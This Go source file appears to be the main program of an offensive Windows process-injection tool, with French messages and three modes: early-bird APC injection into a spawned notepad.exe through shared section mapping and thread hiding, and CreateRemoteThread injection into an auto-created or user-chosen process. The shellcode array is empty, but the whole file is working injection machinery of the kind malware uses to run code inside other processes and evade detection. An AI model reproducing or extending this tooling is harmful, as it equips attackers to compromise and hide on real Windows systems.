package main

import (
	i "RaGodahn/injector"
	e "RaGodahn/pe"
	a "RaGodahn/process_a_injector"
	p "RaGodahn/pslistwin"
	"flag"
	"fmt"
	"os"
	"slices"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	pi      syscall.ProcessInformation
	payload = []byte{}
)

func getProcess() windows.Handle {
	processList, err := p.Processes()
	var list []int
	var i int
	if err != nil {
		fmt.Println("cannot read processes")
		os.Exit(3)
	}

	for x := range processList {
		var process p.Process = processList[x]
		fmt.Printf("%d\t%s\n", process.Pid(), process.Executable())
		list = append(list, process.Pid())
	}

	fmt.Printf("Please input the PID of the process you wish to inject:")
	fmt.Scanln(&i)

	if !slices.Contains(list, i) {
		fmt.Println("PID inputed does not match any running process")
		os.Exit(3)
	}

	return p.GetProcessHandle(i)

}

func PE(path string) {
	var err error
	var target string = path
	ntdll, _ := syscall.LoadLibrary("ntdll.dll")
	defer syscall.FreeLibrary(ntdll)

	kernel32, _ := syscall.LoadLibrary("kernel32.dll")
	defer syscall.FreeLibrary(kernel32)

	procHandle, threadHandle, _ := e.CreateProcessInt(kernel32, target)

	section, _ := e.CreateNewSection(ntdll)

	var size uint32 = 512

	curHandle := uintptr(windows.CurrentProcess())
	localBaseAddr, _, _ := e.MapViewOfSection(ntdll, section, curHandle, size, 0)

	fmt.Printf("mapViewOfSection réussie \n")
	e.Memcpy(localBaseAddr, unsafe.Pointer(&payload[0]), len(payload))

	remoteBaseAddr, _, _ := e.MapViewOfSection(ntdll, section, procHandle, size, 0)
	fmt.Printf("localBaseAddr: %x \nremoteBaseAddr: %x\n", localBaseAddr, remoteBaseAddr)

	err = e.QueueApcThread(ntdll, threadHandle, remoteBaseAddr)
	if err != nil {
		fmt.Println(err)
	}
	err = e.SetInformationThread(ntdll, threadHandle)
	if err != nil {
		fmt.Println(err)
	}
	err = e.ResumeThread(ntdll, threadHandle)
	if err != nil {
		fmt.Println(err)
	}
}

func processAuto() {
	pi := a.CreateProcess()
	i.CreateRemoteThread(payload, pi)
}

func processManuel() {
	pi = syscall.ProcessInformation{
		Process:   syscall.Handle(getProcess()),
		Thread:    0,
		ProcessId: uint32(syscall.Getpid()),
		ThreadId:  uint32(syscall.Getpid()),
	}
	pid := &pi
	i.CreateRemoteThread(payload, pid)
}

func main() {

	var mode string
	flag.StringVar(&mode, "mode", "", "Injection mode\n"+
		"PE\n"+
		"Process-auto\n"+
		"Process-manuel\n")
	flag.Parse()

	switch mode {
	case "PE":
		PE("C:\\Windows\\System32\\notepad.exe")
		break
	case "Process-auto":
		processAuto()
		break
	case "Process-manuel":
		processManuel()
		break
	default:
		fmt.Println("Aucun mode d'injection n'a été sélectionné")
	}

}
